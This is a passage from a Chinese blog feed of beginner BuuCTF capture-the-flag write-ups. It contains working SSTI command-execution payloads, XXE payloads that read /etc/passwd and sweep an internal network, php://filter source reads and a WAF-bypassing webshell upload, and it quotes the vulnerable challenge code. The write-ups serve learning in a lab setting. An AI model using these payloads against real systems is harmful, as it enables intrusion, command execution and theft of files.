<span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span></span>):<span class="hljs-comment">#返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span>  crypt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment">#此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main( key , message )<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)<br></code></pre></td></tr></table></figure>他这个加密过程大致是我们的输入`secret`经过`RC4`后是`base64`编码，然后渲染输出`base64`解码的结果。存在`render_template_string`，参数又是可控的，猜测是`SSTI`。我们需要让它`render_template_string`的参数是`payload`先试试`&#123;&#123;config&#125;&#125;`:`.%14ZZ%C2%A4%01%02iv%C2%80`![doublesecret5](img/doublesecret5.png)加密：`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>/secret?secret=.J%19S¥%15Km%2B%C2%94ÖS%C2%85%C2%8F¸%C2%97%0B%C2%90X5¤AßMD®%07%C2%8BSß7Ø%12Åré%1Bä*çwÛ%C2%9Eñh%1D%C2%82%25íô%06)%7Fðo%2C%C2%9E9%08Ç÷u.û%C2%95%14¿v%05%19j®LÚ-ãt¬%7FX%2C8L%C2%81ÑHÿöãÚõ%C2%9A¦%23%06§¸»¹ænyØÊj»%25X%15×%C2%84F%24%1As^%C2%9B×¤ j¥/%17%1Cßs¯6Å¥±.è¢Y!¨à%10%C2%8Aa]\%2BÎ°%C2%99à¾%C2%87-%10x ]Ú%0B%C2%882PãÜ%1A%3A%3Fæ² ¢Â¹%0F%0BÕG%23-é¢%19Å²%C2%8F&quot;î£%C2%93lÊ&#123;%03ù¶%C2%92×%11 Üîê%02`![doublesecret4](img/doublesecret4.png)感觉`safe`过滤没啥用，只会提示`xxx is not allowed`，该执行还是会执行读`flag.txt`:`&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></p><p><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23~%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>先看源码：</p><p><img src="/img/truecookbook1.png" alt="truecookbook1"></p><p>直接访问，但：</p><p><img src="/img/truecookbook2.png" alt="truecookbook2"></p><p>没法访问，这里应该是要传东西进去</p><p>抓包：</p><p><img src="/img/rutecookbook4.png" alt="rutecookbook4"></p><p>请求与响应包的携带的数据都是<code>XML</code>格式，并且返回包中的<code>msg</code>标签值与请求包中的<code>username</code>标签值相同。尝试使用<code>XXE</code>，数据注入点在<code>username</code>标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook5.png" alt="truecookbook5"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook6.png" alt="truecookbook6"></p><p>伪协议读<code>doLogin.php</code>(路径根据之前的报错)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看了其它师傅的<code>wp</code>，这里主要是用<code>XXE</code>进行内网扫描去找存活主机(可以探测内网)<code>https://xz.aliyun.com/t/3357#toc-11</code>。</p><p>可能获取到内网ip的敏感文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>network/interfaces<br><span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-regexp">/proc/</span>net/arp<br><span class="hljs-regexp">/proc/</span>net/tcp<br><span class="hljs-regexp">/proc/</span>net/udp<br><span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-regexp">/proc/</span>net/fib_trie<br></code></pre></td></tr></table></figure><p>尝试：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/proc/net/fib_trie&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat2.png" alt="xxewhat2"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考：https://www.cnblogs.com/Article-kelp/p/16026652.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br>url=<span class="hljs-string">&quot;http://e28cd6e3-3ea2-4656-ae5c-e267a4e7b8cd.node4.buuoj.cn:81/doLogin.php&quot;</span><br>rawPayload=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;]&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;user&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&amp;payload1;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;23&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/user&gt;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>    payload=rawPayload.<span class="hljs-built_in">format</span>(i)<br>    <span class="hljs-comment">#payload=rawPayload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="hljs-built_in">format</span>(i),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        resp=res.post(url,data=payload,timeout=<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(resp.text,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat1.png" alt="xxewhat1"></p><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p><img src="/img/hfctfjustescape1.png" alt="hfctfjustescape1"></p><p><code>/?run.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;code&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(code);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_5</title>
    <link href="/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/"/>
    <url>/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="红明谷杯2021-write-shell"><a href="#红明谷杯2021-write-shell" class="headerlink" title="[红明谷杯2021]write_shell"></a>[红明谷杯2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123; <span class="hljs-comment">//这东西说白了就是一层一层去检测输入的内容</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125; <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-comment">//??表示来设置默认值，即如果不存在则设置为空</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//同上，若不存在则设置为空</span><br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<span class="hljs-comment">//将data写入dir/index.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码其实很好理解，我们的输入(也可以是数组的形式)会经过<code>check</code>检查。检查没问题的话可以先通过<code>/?action=pwd</code>获得<code>dir</code>的值(这东西后面会去和<code>index.php</code>拼接组成完整路径)。然后<code>/?action=upload&amp;data=我们要写进去的webshell</code>会把<code>webshell</code>写到路径里。</p><p>参考：<code>https://blog.csdn.net/cjdgg/article/details/118216890</code></p><p><code>php</code>短标签：</p><p><img src="/img/writeshell1.png" alt="writeshell1"></p><p><code>php</code>中的“&#96;&#96;”也可以用来执行命令：</p><p><img src="/img/writeshell2.png" alt="writeshell2"></p><p><code>/?action=pwd</code>:</p><p><img src="/img/writeshell3.png" alt="writeshell3"></p><p><code>sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</code></p><p><code>/?action=upload&amp;data=&lt;?=</code>ls<code>?&gt;</code>:</p><p>index.php</p><p><code>?action=upload&amp;data=&lt;?=</code>ls%09&#x2F;<code>?&gt;</code>(空格用<code>%09</code>代替)</p><p><img src="/img/writeshell4.png" alt="writeshell4"></p><p><code>/?action=upload&amp;data=&lt;?=</code>cat%09&#x2F;flllllll1112222222lag<code>?&gt;</code></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="/img/cyberpunk1.png" alt="cyberpunk1"></p><p>商店界面，下面还有订单管理功能：</p><p><img src="/img/cyberpunk2.png" alt="cyberpunk2"></p><p>源码中存在如下提示：</p><p><img src="/img/cyberpunk3.png" alt="cyberpunk3"></p><p><code>?file=</code>，猜测<code>GET</code>方式给<code>file</code>传参。试了试<code>/?file=flag.php</code>没啥反应。伪协议读源码试试：</p><p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><br><span class="hljs-comment">// $file = $_GET[&quot;file&quot;];</span><br><span class="hljs-variable">$file</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-literal">null</span>);<br><span 